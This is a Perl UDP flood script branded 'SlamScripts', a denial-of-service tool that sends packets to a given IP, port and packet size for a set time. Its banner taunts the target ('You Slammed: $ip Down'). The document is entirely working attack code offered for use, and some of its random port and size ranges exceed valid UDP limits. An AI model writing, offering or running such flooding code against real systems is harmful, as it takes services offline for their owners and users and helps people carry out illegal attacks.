 #!/usr/bin/perl

##
# SlamScripts
##

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
use Term::ANSIColor;
print color 'green';
print <<EOTEXT;


**********************************************************
**********************************************************
***███████╗ ██████╗██████╗ ██╗██████╗ ████████╗███████╗***
***██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝██╔════╝***
***███████╗██║     ██████╔╝██║██████╔╝   ██║   ███████╗***
***╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   ╚════██║***
***███████║╚██████╗██║  ██║██║██║        ██║   ███████║***
***╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ╚══════╝***
**********************************************************
**********************************************************

Custom VPS Script by SlamScripts

 ~You Slammed: $ip  Down In a few Second !
 ~Your Hitting This Bum For $time Second !
 ~Using Port ($port)
 ~Slapping With  ($size)

EOTEXT
use Term::ANSIColor;
print color 'cyan';
print "IP: $ip " . "PORT: " . ($port ? $port : "random") . " 
: " .
  ($size ? "$size BYTE(S)" : "Time !") . " 
" .
  ($time ? " FOR $time SECONDE(S)" : "") . "\n";
print "Stop Attk With: CTRL + C" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, 
$iaddr));}  